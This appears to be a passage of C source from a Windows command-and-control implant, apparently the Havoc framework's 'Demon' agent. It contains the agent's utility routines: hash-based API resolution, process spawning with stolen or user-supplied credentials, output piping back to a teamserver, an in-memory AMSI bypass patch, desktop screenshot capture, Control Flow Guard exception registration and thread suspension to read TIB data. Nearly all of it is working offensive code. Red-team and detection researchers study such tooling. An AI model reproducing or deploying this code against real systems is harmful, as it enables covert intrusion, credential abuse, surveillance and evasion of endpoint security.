#include <Core/WinUtils.h>
#include <Core/MiniStd.h>
#include <Core/Package.h>

#include <Common/Macros.h>

/*!
 * Extended String Hasher
 * @param String
 * @param Length
 * @param Upper
 * @return
 */
ULONG HashEx(
    IN PVOID String,
    IN ULONG Length,
    IN BOOL  Upper
) {
    ULONG  Hash = HASH_KEY;
    PUCHAR Ptr  = String;

    if ( ! String ) {
        return 0;
    }

    do {
        UCHAR character = *Ptr;

        if ( ! Length ) {
            if ( ! * Ptr ) {
                break;
            }
        } else {
            if ( ( ULONG ) ( C_PTR( Ptr ) - String ) >= Length ) {
                break;
            }

            if ( !*Ptr ) {
                ++Ptr;
            }
        }

        if ( Upper ) {
            if ( character >= 'a' ) {
                character -= 0x20;
            }
        }

        Hash = ( ( Hash << 5 ) + Hash ) + character;

        ++Ptr;
    } while ( TRUE );

    return Hash;
}

/*!
 * load module from PEB InLoadOrderModuleList
 * @param Hash
 * @return
 */
PVOID LdrModulePeb(
    IN DWORD Hash
) {
    PLDR_DATA_TABLE_ENTRY Ldr = NULL;
    PLIST_ENTRY		      Hdr = NULL;
    PLIST_ENTRY		      Ent = NULL;
    PPEB			      Peb = NULL;

    /* Get pointer to list */
    if ( ! Instance.Teb ) {
        Instance.Teb = NtCurrentTeb();
    }

    Peb = Instance.Teb->ProcessEnvironmentBlock;
    Hdr = & Peb->Ldr->InLoadOrderModuleList;
    Ent = Hdr->Flink;

    for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
        Ldr = C_PTR( Ent );

        /* Compare the DLL Name! */
        if ( ( HashEx( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length, TRUE ) == Hash ) || Hash == 0 ) {
            return Ldr->DllBase;
        }
    }

    return NULL;
}

PVOID LdrModuleLoad(
    IN LPSTR ModuleName
) {
    UNICODE_STRING UnicodeString  = { 0 };
    WCHAR          MdlName[ 260 ] = { 0 };
    PVOID          Module         = NULL;
    USHORT         DestSize       = 0;
    NTSTATUS       NtStatus       = STATUS_SUCCESS;

    if ( ! ModuleName ) {
        return NULL;
    }

    CharStringToWCharString( MdlName, ModuleName, StringLengthA( ModuleName ) );

    DestSize                    = StringLengthW( MdlName ) * sizeof( WCHAR );
    UnicodeString.Length        = DestSize;
    UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
    UnicodeString.Buffer        = MdlName;

    /* Let's load that Module
     * NOTE: LdrLoadDll needs to be resolved or else we have a problem */
    if ( Instance.Win32.LdrLoadDll ) {
        if ( ! NT_SUCCESS( NtStatus = Instance.Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Module ) ) ) {
            PRINTF( "LdrLoadDll Failed: %p\n", NtStatus )
            NtSetLastError( NtStatus );
        }
    }

    return Module;
}

/*!
 * gets the function pointer
 * @param Module
 * @param FunctionHash
 * @return
 */
PVOID LdrFunctionAddr(
    IN PVOID Module,
    IN DWORD Hash
) {
    PIMAGE_NT_HEADERS       NtHeader         = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
    SIZE_T                  ExpDirectorySize = 0;
    PDWORD                  AddrOfFunctions  = NULL;
    PDWORD                  AddrOfNames      = NULL;
    PWORD                   AddrOfOrdinals   = 0;
    PVOID                   FunctionAddr     = NULL;
    PCHAR                   FunctionName     = NULL;
    ANSI_STRING             AnsiString       = { 0 };

    NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpDirectorySize = U_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );

    AddrOfNames      = C_PTR( Module + ExpDirectory->AddressOfNames );
    AddrOfFunctions  = C_PTR( Module + ExpDirectory->AddressOfFunctions );
    AddrOfOrdinals   = C_PTR( Module + ExpDirectory->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {
        FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
        if ( HashEx( FunctionName, 0, TRUE ) == Hash )
        {
            FunctionAddr = C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );

            /* if this is a redirect function then use LdrGetProcedureAddress */
            if ( ( ULONG_PTR ) FunctionAddr >= ( ULONG_PTR ) ExpDirectory &&
                 ( ULONG_PTR ) FunctionAddr <  ( ULONG_PTR ) ExpDirectory + ExpDirectorySize )
            {
                AnsiString.Length        = StringLengthA( FunctionName );
                AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
                AnsiString.Buffer        = FunctionName;

                if ( ! NT_SUCCESS( Instance.Win32.LdrGetProcedureAddress( Module, &AnsiString, 0, &FunctionAddr ) ) ) {
                    return NULL;
                }
            }

            return FunctionAddr;
        }
    }

    PRINTF( "API not found: FunctionHash:[%lx]\n", Hash )

    return NULL;
}

/*!
 * opens a handle to the specified pid with specified access
 * @param ProcessID
 * @param Access
 * @return
 */
HANDLE ProcessOpen(
    IN DWORD Pid,
    IN DWORD Access
) {
    HANDLE    Process  = INVALID_HANDLE_VALUE;
    CLIENT_ID Client   = { 0 };
    OBJ_ATTR  ObjAttr  = { 0 };
    NTSTATUS  NtStatus = STATUS_SUCCESS;

    /* set our target process */
    Client.UniqueProcess = C_PTR( Pid );

    /* open process handle */
    if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcess( &Process, Access, &ObjAttr, &Client ) ) ) {
        PRINTF( "NtOpenProcess Failed => %lx\n", NtStatus )
        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
    }

    return Process;
}

/*!
 * checks if a process runs under Wow64
 * @param Process
 * @return
 */
BOOL ProcessIsWow(
    IN HANDLE Process
) {
    PVOID    IsWow64  = NULL;
    NTSTATUS NtStatus = STATUS_SUCCESS;

    if ( ! Process ) {
        return FALSE;
    }

    if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtQueryInformationProcess( Process, ProcessWow64Information, &IsWow64, sizeof( PVOID ), NULL ) ) ) {
        PRINTF( "[!] NtQueryInformationProcess Failed: Handle[%x] Status[%lx]\n", Process, NtStatus )
        IsWow64 = FALSE;
    }

    return U_PTR( IsWow64 );
}

/*!
 * Starts a Process
 *
 * @param x86 start 32-bit/wow64 process
 * @param App App path
 * @param CmdLine Process to run
 * @param Flags Process Flags
 * @param ProcessInfo Process Information struct
 * @param Piped Send output back
 * @param AnonPipes Uses Anon pipe struct as default pipe. only works if Piped is to False
 * @brief Spawns a process with current set settings (ppid spoof, blockdll, token)
 * @return
 */
BOOL ProcessCreate(
    IN  BOOL                 x86,
    IN  LPWSTR               App,
    IN  LPWSTR               CmdLine,
    IN  DWORD                Flags,
    OUT PROCESS_INFORMATION* ProcessInfo,
    IN  BOOL                 Piped,
    IN  PANONPIPE            DataAnonPipes
) {
    PPACKAGE        Package     = NULL;
    PANONPIPE       AnonPipe    = { 0 };
    STARTUPINFOW    StartUpInfo = { 0 };
    BOOL            Return      = TRUE;

    StartUpInfo.cb          = sizeof( STARTUPINFOA );
    StartUpInfo.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    StartUpInfo.wShowWindow = SW_HIDE;

    Package = PackageCreate( DEMON_INFO );
    PackageAddInt32( Package, DEMON_INFO_PROC_CREATE );

    if ( Piped )
    {
        PUTS( "Piped enabled" )
        AnonPipe = Instance.Win32.LocalAlloc( LPTR, sizeof( ANONPIPE ) );
        MemSet( AnonPipe, 0, sizeof( ANONPIPE ) );
        AnonPipesInit( AnonPipe );

        StartUpInfo.hStdError  = AnonPipe->StdOutWrite;
        StartUpInfo.hStdOutput = AnonPipe->StdOutWrite;
        StartUpInfo.hStdInput  = NULL;
    }

    if ( DataAnonPipes ) {
        PUTS( "Using specified anon pipes" )
        StartUpInfo.hStdError  = DataAnonPipes->StdOutWrite;
        StartUpInfo.hStdOutput = DataAnonPipes->StdOutWrite;
        StartUpInfo.hStdInput  = NULL;
    }

    /*
    TODO: doesn't work. always getting ERROR_INVALID_FUNCTION
    if ( EnableWow64 )
    {
        PUTS( "Enable Wow64 process support" )
        if ( ! Instance.Win32.Wow64DisableWow64FsRedirection( &Wow64Value ) )
        {
            PRINTF( "Failed to disable wow64 redirection: %d : %x\n", NtGetLastError(), Wow64Value )
            PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            Return = FALSE;
            goto Cleanup;
        }
    }*/

    if ( Instance.Tokens.Impersonate )
    {
        PUTS( "Impersonate" )

        LPWSTR lpCurrentDirectory   = NULL;
        WCHAR  Path[ MAX_PATH * 2 ] = { 0 };

        if ( Instance.Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) ) {
            lpCurrentDirectory = Path;
        }

        TokenImpersonate(FALSE);
        TokenSetPrivilege( SE_IMPERSONATE_NAME, TRUE );

        PRINTF( "CmdLine           : %ls\n", CmdLine )
        PRINTF( "lpCurrentDirectory: %ls\n", lpCurrentDirectory )

        if ( Instance.Tokens.Token->Type == TOKEN_TYPE_STOLEN )
        {
            PUTS( "CreateProcessWithTokenW" )
            if ( ! Instance.Win32.CreateProcessWithTokenW(
                    Instance.Tokens.Token->Handle,
                    LOGON_NETCREDENTIALS_ONLY,
                    App,
                    CmdLine,
                    Flags | CREATE_NO_WINDOW,
                    NULL,
                    lpCurrentDirectory,
                    &StartUpInfo,
                    ProcessInfo
                    )
                )
            {
                PRINTF( "CreateProcessWithTokenW: Failed [%d]\n", NtGetLastError() );
                TokenImpersonate(TRUE);
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                Return = FALSE;
                goto Cleanup;
            }
        }
        else if ( Instance.Tokens.Token->Type == TOKEN_TYPE_MAKE_NETWORK )
        {
            PUTS( "CreateProcessWithLogonW" )
            PRINTF( "lpUser[%s] lpDomain[%s] lpPassword[%s]", Instance.Tokens.Token->lpUser, Instance.Tokens.Token->lpDomain, Instance.Tokens.Token->lpPassword )
            if ( ! Instance.Win32.CreateProcessWithLogonW(
                        Instance.Tokens.Token->lpUser,
                        Instance.Tokens.Token->lpDomain,
                        Instance.Tokens.Token->lpPassword,
                        LOGON_NETCREDENTIALS_ONLY,
                        App,
                        CmdLine,
                        Flags | CREATE_NO_WINDOW,
                        NULL,
                        lpCurrentDirectory,
                        &StartUpInfo,
                        ProcessInfo
                    )
                )
            {
                PRINTF( "CreateProcessWithLogonW: Failed [%d]\n", NtGetLastError() );
                TokenImpersonate(TRUE);
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                Return = FALSE;
                goto Cleanup;
            }
        }

        TokenImpersonate(TRUE);
    }
    else
    {
        if ( ! Instance.Win32.CreateProcessW(
                App,
                CmdLine,
                NULL,
                NULL,
                TRUE,
                Flags | CREATE_NO_WINDOW,
                NULL,
                NULL,
                &StartUpInfo,
                ProcessInfo
                )
            )
        {
            PRINTF( "CreateProcessA: Failed [%d]\n", NtGetLastError() );
            PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            Return = FALSE;
            goto Cleanup;
        }
    }

    /*
    TODO: doesn't work. always getting ERROR_INVALID_FUNCTION
    if ( EnableWow64 )
    {
        if ( ! Instance.Win32.Wow64RevertWow64FsRedirection( Wow64Value ) )
        {
            PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            Return = FALSE;
            goto Cleanup;
        }
    }
     */

    /* Check if we managed to spawn a process */
    if ( ProcessInfo->hProcess && Instance.Config.Implant.Verbose )
    {
        PUTS( "Send info back" )
        if ( ! CmdLine )
        {
            PackageAddWString( Package, App );
            PackageAddInt32( Package, ProcessInfo->dwProcessId );
            PackageTransmit( Package, NULL, NULL );
        }
        else
        {
            INT32 i  = 0;
            INT32 x  = ( INT32 ) StringLengthW( CmdLine );
            PWCHAR s = Instance.Win32.LocalAlloc( LPTR, x * sizeof( WCHAR ) );

            MemCopy( s, CmdLine, x );

            // remove the arguments. we are just interested in the process name/path
            for ( ; i < x; i++ )
                if ( s[ i ] == ' ' ) break;
            PUTS( s )
            s[ i ] = 0;

            PRINTF( "Process start :: Path:[%ls] ProcessId:[%d]\n", s, ProcessInfo->dwProcessId );

            PackageAddWString( Package, s );
            PackageAddInt32( Package, ProcessInfo->dwProcessId );
            PackageTransmit( Package, NULL, NULL );

            PUTS( "Cleanup" )
            MemSet( s, 0, x );
            Instance.Win32.LocalFree( s );
        }
    }

    if ( Piped )
        JobAdd( Instance.CurrentRequestID, ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );

Cleanup:
    return Return;
}

/*!
 * takes a snapshot of current running processes
 * @param SnapShot
 * @param Size
 * @return
 */
NTSTATUS ProcessSnapShot(
    OUT PSYSTEM_PROCESS_INFORMATION* SnapShot,
    OUT PSIZE_T                      Size
) {
    ULONG    Length   = 0;
    NTSTATUS NtStatus = STATUS_SUCCESS;

    if ( ! SnapShot || ! Size ) {
        return STATUS_INVALID_PARAMETER;
    }

    /* Get our system process list */
    if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtQuerySystemInformation( SystemProcessInformation, NULL, 0, &Length ) ) )
    {
        PRINTF( "SystemProcessInformation Length: %d\n", Length );

        /* just in case that some processes or threads where created between our calls */
        Length += 0x1000;

        /* allocate memory */
        *SnapShot = NtHeapAlloc( Length );
        if ( *SnapShot ) {
            if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtQuerySystemInformation( SystemProcessInformation, *SnapShot, Length, &Length ) ) ) {
                PRINTF( "NtQuerySystemInformation Failed: Status[%lx]\n", NtStatus )
                goto LEAVE;
            }
        } else NtStatus = STATUS_NO_MEMORY;

        *Size = Length;
    } else {
        /* we expected to fail. something doesn't seem right... */
        NtStatus = STATUS_INVALID_PARAMETER;
    }

LEAVE:
    return NtStatus;
}

BOOL ReadLocalFile(
    IN  LPCWSTR FileName,
    OUT PVOID*  FileContent,
    OUT PDWORD  FileSize
) {
    BOOL   Success = FALSE;
    DWORD  Read    = 0;
    HANDLE hFile   = NULL;

    hFile = Instance.Win32.CreateFileW( FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
    if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) ) {
        PUTS( "CreateFileW: Failed" )
        PACKAGE_ERROR_WIN32
        goto Cleanup;
    }

    *FileSize    = Instance.Win32.GetFileSize( hFile, 0 );
    *FileContent = Instance.Win32.LocalAlloc( LPTR, *FileSize );

    if ( ! Instance.Win32.ReadFile( hFile, *FileContent, *FileSize, &Read, NULL ) ) {
        PUTS( "ReadFile: Failed" )
        PACKAGE_ERROR_WIN32
        goto Cleanup;
    }

    Success = TRUE;

Cleanup:
    if ( hFile ) {
        Instance.Win32.NtClose( hFile );
        hFile = NULL;
    }

    if ( ! Success && *FileContent )
    {
        Instance.Win32.LocalFree( *FileContent );
        *FileContent = NULL;
        *FileSize    = 0;
    }

    return Success;
}

/* Patch AMSI
 * TODO: remove this and replace it with hardware breakpoints */
BOOL BypassPatchAMSI(
    VOID
) {
    HINSTANCE hModuleAmsi   = NULL;
    LPVOID pAddress         = NULL;
    CHAR module[10]         = { 0 };

#ifdef _M_AMD64
    UCHAR amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; //x64
#elif defined(_M_IX86)
    unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };//x86
#endif

    module[0] = 'a';
    module[1] = 'm';
    module[2] = 's';
    module[3] = 'i';
    module[4] = '.';
    module[5] = 'd';
    module[6] = 'l';
    module[7] = 'l';
    module[8] = 0;

    hModuleAmsi = LdrModuleLoad( module );

    PRINTF( "[+] Loaded asmi.dll: %p\n", hModuleAmsi );

    pAddress = LdrFunctionAddr( hModuleAmsi, 0x29fcd18e );
    if( pAddress == NULL )
        return 0;

    PRINTF("[+] asmi function: %p\n", pAddress);

    LPVOID lpBaseAddress = pAddress;
    ULONG  OldProtection, NewProtection;
    SIZE_T uSize = sizeof(amsiPatch);

    if ( NT_SUCCESS( Instance.Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection ) ) ) {
        MemCopy( pAddress, amsiPatch, sizeof(amsiPatch) );

        if ( NT_SUCCESS( Instance.Syscall.NtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, OldProtection, &NewProtection ) ) ) {
            return TRUE;
        }

        PUTS( "[-] Failed to change back protection" )
    }

    return FALSE;
}

BOOL AnonPipesInit(
    IN PANONPIPE AnonPipes
) {
    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    if ( ! Instance.Win32.CreatePipe( &AnonPipes->StdOutRead, &AnonPipes->StdOutWrite, &SecurityAttr, 0 ) ) {
        PACKAGE_ERROR_WIN32
        return FALSE;
    }

    return TRUE;
}

/*!
 * reads from the specified anonymous pipe and
 * sends the result back to the teamserver
 * @param AnonPipes
 * @param RequestID
 */
VOID AnonPipesRead(
    IN PANONPIPE AnonPipes,
    IN UINT32 RequestID
) {
    PPACKAGE Package         = NULL;
    BOOL     Success         = FALSE;
    LPVOID   Buffer          = NULL;
    UCHAR    buf[ 1024 ]     = { 0 };
    DWORD    dwBufferSize    = 0;
    DWORD    dwRead          = 0;

    PUTS( "Start reading anon pipe" )
    PRINTF( "AnonPipes->StdOutRead => %x\n", AnonPipes->StdOutRead )

    if ( AnonPipes->StdOutWrite ) {
        Instance.Win32.NtClose( AnonPipes->StdOutWrite );
        AnonPipes->StdOutWrite = NULL;
    }

    Buffer = Instance.Win32.LocalAlloc( LPTR, 0 );

    do {
        Success = Instance.Win32.ReadFile( AnonPipes->StdOutRead, buf, 1024, &dwRead, NULL );
        PRINTF( "dwRead => %d\n", dwRead )

        if ( dwRead == 0 ) {
            break;
        }

        dwBufferSize += dwRead;

        Buffer = Instance.Win32.LocalReAlloc( Buffer, dwBufferSize, LMEM_MOVEABLE );

        MemCopy( Buffer + ( dwBufferSize - dwRead ), buf, dwRead );
        MemSet( buf, 0, dwRead );
    } while ( Success == TRUE );

    if ( dwBufferSize ) {
        Package = PackageCreateWithRequestID( RequestID, DEMON_OUTPUT );
        PackageAddBytes( Package, Buffer, dwBufferSize );
        PackageTransmit( Package, NULL, NULL );
    }

    DATA_FREE( Buffer, dwBufferSize );
}

/*!
 * takes a BMP screenshot of the current desktop
 * @param ImagePointer
 * @param ImageSize
 * @return
 */
BOOL WinScreenshot(
    OUT PVOID*  ImagePointer,
    OUT PSIZE_T ImageSize
) {
    BITMAPFILEHEADER    BitFileHdr  = { 0 };
    BITMAPINFOHEADER    BitInfoHdr  = { 0 };
    BITMAPINFO          BitMapInfo  = { 0 };
    HGDIOBJ             hTempMap    = NULL;
    HBITMAP             hBitmap     = NULL;
    BITMAP              AllDesktops = { 0 };
    HDC                 hDC, hMemDC = NULL;
    BYTE*               bBits       = NULL;
    DWORD               cbBits      = 0;

    PVOID               BitMapImage = NULL;
    DWORD               BitMapSize  = 0;

    INT x = Instance.Win32.GetSystemMetrics( SM_XVIRTUALSCREEN );
    INT y = Instance.Win32.GetSystemMetrics( SM_YVIRTUALSCREEN );

    MemSet( &BitFileHdr, 0, sizeof( BITMAPFILEHEADER ) );
    MemSet( &BitInfoHdr, 0, sizeof( BITMAPINFOHEADER ) );
    MemSet( &BitMapInfo, 0, sizeof( BITMAPINFO ) );
    MemSet( &AllDesktops,0, sizeof( BITMAP ) );

    hDC      = Instance.Win32.GetDC( NULL );
    hTempMap = Instance.Win32.GetCurrentObject( hDC, OBJ_BITMAP );

    Instance.Win32.GetObjectW( hTempMap, sizeof( BITMAP ), &AllDesktops );

    BitFileHdr.bfType        = ( WORD ) ( 'B' | ( 'M' << 8 ) );
    BitFileHdr.bfOffBits     = sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER );
    BitInfoHdr.biSize        = sizeof( BITMAPINFOHEADER );
    BitInfoHdr.biBitCount    = 24;
    BitInfoHdr.biCompression = BI_RGB;
    BitInfoHdr.biPlanes      = 1;
    BitInfoHdr.biWidth       = AllDesktops.bmWidth;
    BitInfoHdr.biHeight      = AllDesktops.bmHeight;

    BitMapInfo.bmiHeader     = BitInfoHdr;

    cbBits     = ( ( ( 24 * AllDesktops.bmWidth + 31 ) &~31 ) / 8 ) * AllDesktops.bmHeight;

    BitMapSize  = cbBits + ( sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ) );
    BitMapImage = Instance.Win32.LocalAlloc( LPTR, BitMapSize );

    hMemDC  = Instance.Win32.CreateCompatibleDC( hDC );
    hBitmap = Instance.Win32.CreateDIBSection( hDC, &BitMapInfo, DIB_RGB_COLORS, ( VOID** ) &bBits, NULL, 0 );

    Instance.Win32.SelectObject( hMemDC, hBitmap );
    Instance.Win32.BitBlt( hMemDC, 0, 0, AllDesktops.bmWidth, AllDesktops.bmHeight, hDC, x, y, SRCCOPY );

    MemCopy( BitMapImage, &BitFileHdr, sizeof( BITMAPFILEHEADER ) );
    MemCopy( BitMapImage + sizeof( BITMAPFILEHEADER ), &BitInfoHdr, sizeof( BITMAPINFOHEADER ) );
    MemCopy( BitMapImage + sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ), bBits, cbBits );

    if ( ImagePointer )
        *ImagePointer = BitMapImage;

    if ( ImageSize )
        *ImageSize = BitMapSize;

    if ( hTempMap ) {
        Instance.Win32.DeleteObject( hTempMap );
    }

    if ( hMemDC ) {
        Instance.Win32.DeleteDC( hMemDC );
    }

    if ( hDC ) {
        Instance.Win32.ReleaseDC( NULL, hDC );
    }

    if ( hBitmap ) {
        Instance.Win32.DeleteObject( hBitmap );
    }

    return TRUE;
}

/*!
 * Read from the pipe and writes it to the specified buffer
 * @param Handle handle to the pipe
 * @param Buffer buffer to save the read bytes from the pipe
 * @return pipe read successful or not
 */
BOOL PipeRead(
    IN HANDLE  Handle,
    IN PBUFFER Buffer
) {
    DWORD Read  = 0;
    DWORD Total = 0;

    do {
        if ( ! Instance.Win32.ReadFile( Handle, C_PTR( U_PTR( Buffer->Buffer ) + Total ), MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX ), &Read, NULL ) ) {
            if ( NtGetLastError() != ERROR_MORE_DATA ) {
                PRINTF( "ReadFile failed with %d\n", NtGetLastError() )
                return FALSE;
            }
        }

        Total += Read;
    } while ( Total < Buffer->Length );

    return TRUE;
}

/*!
 * Write the specified buffer to the specified pipe
 * @param Handle handle to the pipe
 * @param Buffer buffer to write
 * @return pipe write successful or not
 */
BOOL PipeWrite(
    IN HANDLE   Handle,
    OUT PBUFFER Buffer
) {
    DWORD Written = 0;
    DWORD Total   = 0;

    do {
        if ( ! Instance.Win32.WriteFile( Handle, Buffer->Buffer + Total, MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX ), &Written , NULL ) ) {
            return FALSE;
        }

        Total += Written;
    } while ( Total < Buffer->Length );

    return TRUE;
}

typedef struct __attribute__((packed))
{
    ULONG ExtendedProcessInfo;
    ULONG ExtendedProcessInfoBuffer;
} EXTENDED_PROCESS_INFORMATION, *PEXTENDED_PROCESS_INFORMATION;

/*!
 * @brief
 *  check if CFG is enforced in this current process.
 *
 * @return
 */
BOOL CfgQueryEnforced(
    VOID
) {
    EXTENDED_PROCESS_INFORMATION ProcInfoEx = { 0 };
    NTSTATUS                     NtStatus   = STATUS_SUCCESS;

    ProcInfoEx.ExtendedProcessInfo       = ProcessControlFlowGuardPolicy;
    ProcInfoEx.ExtendedProcessInfoBuffer = 0;

    /* query if Cfg is enabled or not. */
    if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtQueryInformationProcess(
        NtCurrentProcess(),
        ProcessCookie | ProcessUserModeIOPL,
        &ProcInfoEx,
        sizeof( ProcInfoEx ),
        NULL )
    ) ) {
        PRINTF( "NtQueryInformationProcess Failed => %p\n", NtStatus );
        return FALSE;
    }

    PRINTF( "Control Flow Guard Policy Enabled = %s\n", ProcInfoEx.ExtendedProcessInfoBuffer ? "TRUE" : "FALSE" );
    return U_PTR( ProcInfoEx.ExtendedProcessInfoBuffer );
}

/*!
 * @brief
 *  add module + function to CFG exception list.
 *
 * @param ImageBase
 * @param Function
 */
VOID CfgAddressAdd(
    IN PVOID ImageBase,
    IN PVOID Function
) {
    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    PIMAGE_NT_HEADERS    NtHeader = { 0 };
    ULONG                Output   = 0;
    NTSTATUS             NtStatus = STATUS_SUCCESS;

    NtHeader                = C_PTR( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
    MemRange.NumberOfBytes  = U_PTR( NtHeader->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 );
    MemRange.VirtualAddress = ImageBase;

    /* set cfg target call info */
    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = Function - ImageBase;

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtSetInformationVirtualMemory( NtCurrentProcess(), VmCfgCallTargetInformation, 1, &MemRange, &VmInfo, sizeof( VmInfo ) ) ) ) {
        PRINTF( "NtSetInformationVirtualMemory Failed => %p", NtStatus );
    }
}

/*!
 * Sets an event
 * @param Event
 */
BOOL EventSet(
    IN HANDLE Event
) {
    return NT_SUCCESS( Instance.Win32.NtSetEvent( Event, NULL ) );
}

/*!
 * queries the NT_TIB from the specified leaked thread RSP address
 *
 * NOTE:
 *  this function is entirely taken from Austins Hudson's implementation.
 *  reference: https://github.com/realoriginal/titanldr-ng/blob/master/Obf.c#L215
 *
 * @param Adr leaked rsp address
 * @param Tib random tib
 * @return
 */
BOOL ThreadQueryTib(
    IN  PVOID   Adr,
    OUT PNT_TIB Tib
) {
    THREAD_TEB_INFORMATION   ThdTebInfo = { 0 };
    MEMORY_BASIC_INFORMATION Memory1    = { 0 };
    MEMORY_BASIC_INFORMATION Memory2    = { 0 };
    CLIENT_ID                Client     = { 0 };
    CONTEXT                  ThdCtx     = { 0 };
    HANDLE                   ThdHndl    = NULL;
    HANDLE                   ThdNext    = NULL;
    BOOL                     Success    = FALSE;
    DWORD                    ThreadId   = 0;

    /* our current thread id */
    ThreadId            = U_PTR( Instance.Teb->ClientId.UniqueThread );
    ThdCtx.ContextFlags = CONTEXT_FULL;

    /* iterate over current process threads */
    while ( NT_SUCCESS( Instance.Win32.NtGetNextThread( NtCurrentProcess(), ThdHndl, THREAD_ALL_ACCESS, 0, 0, &ThdNext ) ) )
    {
        /* if the thread handle is valid close it */
        if ( ThdHndl ) {
            Instance.Win32.NtClose( ThdHndl );
        }

        /* set the next thread */
        ThdHndl = ThdNext;

        /* setup params we want to query */
        ThdTebInfo.TebOffset      = FIELD_OFFSET( TEB, ClientId );
        ThdTebInfo.BytesToRead    = sizeof( CLIENT_ID );
        ThdTebInfo.TebInformation = C_PTR( &Client );

        /* query information about the target thread */
        if ( NT_SUCCESS( Instance.Syscall.NtQueryInformationThread( ThdHndl, ThreadTebInformation, &ThdTebInfo, sizeof( ThdTebInfo ), NULL ) ) )
        {
            /* if it's not our current thread then continue. */
            if ( ThreadId != U_PTR( Client.UniqueThread ) )
            {
                /* suspend target thread */
                if ( NT_SUCCESS( Instance.Syscall.NtSuspendThread( ThdHndl, NULL ) ) )
                {
                    /* get target thread context  */
                    if ( NT_SUCCESS( Instance.Syscall.NtGetContextThread( ThdHndl, &ThdCtx ) ) )
                    {
                        /* query memory info about rsp address */
#if _WIN64
                        if ( NT_SUCCESS( Instance.Syscall.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( ThdCtx.Rsp ), MemoryBasicInformation, &Memory1, sizeof( Memory1 ), NULL ) ) )
#else
                        if ( NT_SUCCESS( Instance.Syscall.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( ThdCtx.Esp ), MemoryBasicInformation, &Memory1, sizeof( Memory1 ), NULL ) ) )
#endif
                        {
                            /* query memory info about rsp address */
                            if ( NT_SUCCESS( Instance.Syscall.NtQueryVirtualMemory( NtCurrentProcess(), Adr, MemoryBasicInformation, &Memory2, sizeof( Memory2 ), NULL ) ) )
                            {
                                /* check if it's the same region */
                                if ( U_PTR( Memory1.AllocationBase ) == U_PTR( Memory2.AllocationBase ) )
                                {
                                    /* setup params we want to query */
                                    ThdTebInfo.TebOffset      = FIELD_OFFSET( TEB, NtTib );
                                    ThdTebInfo.BytesToRead    = sizeof( NT_TIB );
                                    ThdTebInfo.TebInformation = C_PTR( Tib );

                                    /* Query information about the target thread */
                                    if ( NT_SUCCESS( Instance.Syscall.NtQueryInformationThread( ThdHndl, ThreadTebInformation, &ThdTebInfo, sizeof( ThdTebInfo ), NULL ) ) ) {
                                        Success = TRUE;
                                    }
                                }
                            }
                        }
                    }

                    /* resume target thread */
                    Instance.Syscall.NtResumeThread( ThdHndl, NULL );
                }
            }
        }

        /* did we successfully retrieve Tib ?
         * if yes then break loop. we got what we wanted */
        if ( Success ) {
            break;
        }
    }

    /* if the thread handle is valid close it */
    if ( ThdHndl ) {
        Instance.Win32.NtClose( ThdHndl );
        ThdHndl = NULL;
    }

    return Success;
}


/*!
 * generates a random unsigned 32-bit integer
